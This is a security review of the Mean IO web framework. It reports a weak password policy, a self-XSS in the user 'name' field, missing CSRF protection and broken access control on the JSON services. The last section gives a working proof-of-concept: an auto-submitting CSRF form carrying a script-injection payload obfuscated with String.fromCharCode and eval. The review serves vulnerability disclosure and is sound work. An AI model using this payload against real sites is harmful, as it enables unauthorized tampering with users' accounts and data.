Mean IO security review
=======================

I've been meaning to review Mean IO for some time and finally found the time to take a look at it. 

Password handling
-----------------
I was really happy to see to see that Mean IO is using pbkdf/2 for password hashing before storing it. It's using a 16 byte salt created using crypto.randomBytes and it's using 10000 rounds with a keylength of 64 bytes.

The password policy is however pretty weak. The only requirement is that passwords are between 8 and 20 characters. There are no character set requirements (upper, lower, numeric, special) and the maximum length of 20 is very odd. Why set such a low maximum length. The storage size is the same for 8 character and 100 character password after hashing.

Also there is no rate limiting or account lockout on password guessing. An external attacker can guess as many times he/she wants for the same account without getting stopped by temporary accounts lockout after a given number of tries or a captcha.


Cross Site Scripting (XSS)
--------------------------
While the templates seem to use proper escaping for most cases, there is a Cross Site Scripting vulnerability in the user's `name` field. This appears after registering a user with a username of `</script><script>alert(1)//`. This is also the only location where data is handled differently from the other data (e.g. loading data through JSON services). The problem here is that the escaping does not take into account the dual context. It is correctly escaping the data for JSON, but does not recognize that the script/JSON context is within an HTML context. This is essentially a self-XSS as it only affects the use logged in with the malicious `name` field.

I would prefer if inline `<script>`-tags were avoided all together. This would make it easier to make use of the Content Security Policy without enabling 'unsafe-inline'.

Cross Site Request Forgery
--------------------------
The MEAN IO default application does not appear to make use of any CSRF-protection. While there is a CSRF middleware available in express.js, it has not been enabled. This makes it possible to create CSRF-attacks that create, update or delete articles. CSRF also makes it possible to attack the registration process and use the XSS-attack described above against other users.

Data manipulation and lack of access control
--------------------------------------------
The MEAN IO currently sample application does not have a proper access control. While only the author of an article, can edit or delete that article through the UI, an attacker can easily edit or delete other users' articles by invoking the JSON services directly.

Also the application does not limit which fields can be altered. As an example the timestamp of the article is not editable through the UI. But again by invoking the JSON service directly, an attacker can alter fields expected to be read-only.

Sample exploit code
-------------------
CSRF exploiting the self-XSS in the `name`-field:

````
<body onload="document.getElementById('aForm').submit()">
<form id="aForm" method="post" action="http://localhost:3000/register" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="username" value="someusername">
<input type="hidden" name="email" value="test@example.com">
<input type="hidden" name="name" value='</script><script>alert(1);eval(String.fromCharCode(119,105,110,100,111,119,46,117,115,101,114,32,61,32,123,34,110,97,109,101,34,58,34,104,97,99,107,101,100,34,44,34,95,105,100,34,58,34,53,52,49,100,97,49,50,99,48,97,99,101,52,51,55,51,55,49,48,48,56,97,102,57,34,44,34,117,115,101,114,110,97,109,101,34,58,34,104,97,99,107,101,100,34,44,34,114,111,108,101,115,34,58,91,34,97,117,116,104,101,110,116,105,99,97,116,101,100,34,93,125))//'>
<input type="hidden" name="password" value="AAAAAAAA">
<input type="hidden" name="confirmPassword" value="AAAAAAAA">
</form>
</body>
````













